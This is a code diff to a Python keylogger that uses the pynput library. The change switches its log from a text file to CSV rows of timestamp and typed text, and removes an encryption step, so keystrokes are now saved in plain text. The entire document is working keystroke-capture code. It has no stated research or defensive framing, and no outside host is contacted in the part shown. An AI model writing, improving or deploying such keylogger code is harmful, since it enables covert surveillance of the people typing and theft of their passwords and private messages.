@@ -3,6 +3,7 @@
 # f.close()
 from my_encrypt import encrypt , decrypt
 import datetime;
+import csv
 from pynput.keyboard import Key, Listener
 
 ct = datetime.datetime.now()
@@ -24,15 +25,22 @@ def on_press(key):
         keys = [] 
 
 def write_file(keys):
-    with open("log.txt", "a") as f:
-        f.write(str(ct) + ' ')
+    with open("log.csv", "a", newline='') as f:
+        field_names = ['time', 'data']
+        writer = csv.DictWriter(f, fieldnames=field_names)
+
+        data_str = ''
         for key in keys:
-            k = str(key).replace("'","")
-            if k.find("space") > 0:
-                f.write(' ')
-            elif k.find("Key") == -1:
-                f.write(encrypt(str(key)))
-        f.write('\n')
+            k = str(key).replace("'", "")
+            
+            if "space" in k:
+                data_str += " "
+            elif "Key" not in k:
+                data_str += k
+            else:
+                continue
+
+        writer.writerow({'time': ct, 'data': data_str})
 
 def on_release(key):
     if key == Key.esc:
